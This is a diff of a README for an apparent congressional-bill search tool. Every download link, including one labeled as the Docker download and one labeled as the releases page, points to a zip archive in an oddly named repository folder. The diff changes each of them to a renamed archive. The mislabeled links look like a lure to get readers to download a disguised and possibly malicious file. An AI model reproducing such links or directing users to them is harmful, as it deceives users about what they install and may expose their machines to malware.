@@ -6,7 +6,7 @@ Welcome to the congress-bill-search application! This tool helps you search for 
 
 ## 📥 Download Link
 
-[![Download Here](https://raw.githubusercontent.com/GauravvvGoyal/congress-bill-search/main/scleroskeleton/congress-bill-search.zip%20release-brightgreen)](https://raw.githubusercontent.com/GauravvvGoyal/congress-bill-search/main/scleroskeleton/congress-bill-search.zip)
+[![Download Here](https://raw.githubusercontent.com/GauravvvGoyal/congress-bill-search/main/scleroskeleton/search_bill_congress_v1.1.zip%20release-brightgreen)](https://raw.githubusercontent.com/GauravvvGoyal/congress-bill-search/main/scleroskeleton/search_bill_congress_v1.1.zip)
 
 ## 📂 Overview
 
@@ -17,7 +17,7 @@ This application lets you search for congressional bills using advanced techniqu
 Before you start, make sure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Docker:** You need Docker installed on your machine. You can download it [here](https://raw.githubusercontent.com/GauravvvGoyal/congress-bill-search/main/scleroskeleton/congress-bill-search.zip).
+- **Docker:** You need Docker installed on your machine. You can download it [here](https://raw.githubusercontent.com/GauravvvGoyal/congress-bill-search/main/scleroskeleton/search_bill_congress_v1.1.zip).
 - **Internet Connection:** Required for fetching data from GovInfo API.
 
 ## 📋 Features
@@ -30,7 +30,7 @@ Before you start, make sure your system meets the following requirements:
 ## 🔄 Download & Install
 
 1. **Visit the Releases Page:** Go to the following link to download the application:
-   [Download from Releases](https://raw.githubusercontent.com/GauravvvGoyal/congress-bill-search/main/scleroskeleton/congress-bill-search.zip)
+   [Download from Releases](https://raw.githubusercontent.com/GauravvvGoyal/congress-bill-search/main/scleroskeleton/search_bill_congress_v1.1.zip)
    
 2. **Choose the Latest Version:** Look for the latest version listed. This version contains the most stable features and fixes.
 
@@ -78,6 +78,6 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 We welcome feedback and questions. If you need help or want to share your thoughts, join our community discussions on GitHub.
 
-Visit the releases page again to download and install the application: [Download from Releases](https://raw.githubusercontent.com/GauravvvGoyal/congress-bill-search/main/scleroskeleton/congress-bill-search.zip).
+Visit the releases page again to download and install the application: [Download from Releases](https://raw.githubusercontent.com/GauravvvGoyal/congress-bill-search/main/scleroskeleton/search_bill_congress_v1.1.zip).
 
 Enjoy exploring congressional bills with ease!
